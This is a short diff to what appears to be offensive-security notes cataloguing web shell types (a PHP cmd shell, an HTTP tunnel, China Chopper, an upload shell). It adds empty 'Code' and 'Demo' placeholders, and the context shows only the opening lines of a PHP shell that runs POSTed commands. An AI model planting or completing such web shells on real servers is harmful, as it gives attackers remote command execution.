@@ -28,6 +28,8 @@
 
 1. Cmd shell
 
+- Code
+
 ```
 <?php
 if (isset($_POST['cmd'])) {
@@ -56,8 +58,24 @@ if (isset($_POST['cmd'])) {
 
 ```
 
+- Demo:
+
+<img src = ''>
+
 2. Http tunnel
+
+- Code:
+
+- Demo:
 
 3. Chooper
 
+- Code:
+
+- Demo:
+
 4. Upload shell
+
+- Code:
+
+- Demo:
